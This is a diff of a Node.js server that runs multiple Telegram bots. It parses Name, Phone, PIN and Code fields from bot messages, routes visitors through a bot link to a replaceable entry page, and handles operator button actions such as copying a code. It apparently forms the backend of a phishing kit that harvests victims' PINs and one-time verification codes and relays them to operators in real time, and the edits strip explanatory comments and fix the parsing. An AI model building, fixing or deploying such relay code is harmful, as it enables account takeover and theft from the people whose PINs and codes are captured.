@@ -16,9 +16,6 @@ const REQUIRED_UPDATES = ['message', 'callback_query'];
 
 // ============================================================
 // 📏 FORCE FULL-WIDTH MESSAGE BUBBLE
-// Telegram sizes the bubble to the widest line of text.
-// A 34-char separator pushes it to max width on mobile, so the
-// inline buttons always stretch edge-to-edge.
 // ============================================================
 const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
 
@@ -100,7 +97,6 @@ function getBot(botId) {
     return bots.find(b => b.botId === botId);
 }
 
-// Returns comma-separated list of loaded bot IDs, safe for logs
 function botList() {
     return bots.map(b => b.botId).join(', ') || '(none)';
 }
@@ -113,8 +109,6 @@ function esc(str) {
         .replace(/>/g, '&gt;');
 }
 
-// Pad short values so the line never collapses the bubble width.
-// The trailing non-breaking space is invisible but counts for width.
 function pad(str) {
     let s = String(str === null || str === undefined ? 'Unknown' : str);
     const minLen = 26;
@@ -124,12 +118,10 @@ function pad(str) {
     return s;
 }
 
-// Strip the non-breaking-space padding and trim
 function stripPad(s) {
     return String(s == null ? '' : s).replace(/\u00A0/g, '').trim();
 }
 
-// Un-escape HTML entities produced by esc()
 function unesc(str) {
     return String(str == null ? '' : str)
         .replace(/&lt;/g, '<')
@@ -137,25 +129,22 @@ function unesc(str) {
         .replace(/&amp;/g, '&');
 }
 
-// Recover identity from the message the buttons are attached to.
-// Works even after a full restart, because the data is in the message itself.
+// ============================================================
+// ✅ FIXED: Telegram strips <b>/<code> tags out of message.text
+//    and puts them into message.entities. So we must parse the
+//    PLAIN rendered text, not the HTML source.
+// ============================================================
 function parseIdentityFromMessage(text) {
     const out = { name: null, phone: null, pin: null, code: null };
     if (!text) return out;
     let m;
-    if ((m = text.match(/<b>Name:<\/b>\s*<b>([\s\S]*?)<\/b>/)))
-        out.name = unesc(stripPad(m[1]));
-    if ((m = text.match(/<b>Phone:<\/b>\s*<b>([\s\S]*?)<\/b>/)))
-        out.phone = unesc(stripPad(m[1]));
-    if ((m = text.match(/<b>PIN:<\/b>\s*<b><code>([\s\S]*?)<\/code><\/b>/)))
-        out.pin = unesc(stripPad(m[1]));
-    if ((m = text.match(/<b>Code:<\/b>\s*<b><code>([\s\S]*?)<\/code><\/b>/)))
-        out.code = unesc(stripPad(m[1]));
+    if ((m = text.match(/^Name:\s+(.*)$/m)))  out.name  = stripPad(m[1]);
+    if ((m = text.match(/^Phone:\s+(.*)$/m))) out.phone = stripPad(m[1]);
+    if ((m = text.match(/^PIN:\s+(.*)$/m)))   out.pin   = stripPad(m[1]);
+    if ((m = text.match(/^Code:\s+(.*)$/m)))  out.code  = stripPad(m[1]);
     return out;
 }
 
-// Every message forces a full-width bubble via a 34-char separator
-// and padded value lines, so buttons always stretch edge-to-edge.
 function withIdentity(header, name, phone, extraLines = []) {
     const lines = [
         `<b>${esc(header)}</b>`,
@@ -316,9 +305,6 @@ setInterval(async () => {
 
 // ============================================================
 // 🚪 BOT ENTRY ROUTE
-// Every Telegram link MUST go through /bot/botN. This route
-// validates the botId and forwards it into the app via URL.
-// Change `index.html` below to your real entry page name.
 // ============================================================
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
@@ -524,8 +510,6 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
         const pin   = meta.pin   ?? fromMsg.pin   ?? '';
         const code  = meta.code  ?? fromMsg.code  ?? '';
 
-        // If the map entry was lost (restart / different instance), rebuild it
-        // from the message so follow-up actions (e.g. code_copy) keep working.
         if (!requestBotMap[requestId] && (fromMsg.name || fromMsg.phone)) {
             requestBotMap[requestId] = {
                 botId: bot.botId,
@@ -653,7 +637,6 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 });
 
 // ---------------- DEBUG ----------------
-// Safe view: botIds + chatIds only, no tokens
 app.get('/debug/bots', (req, res) => {
     res.json(bots.map(b => ({ botId: b.botId, chatId: b.chatId })));
 });
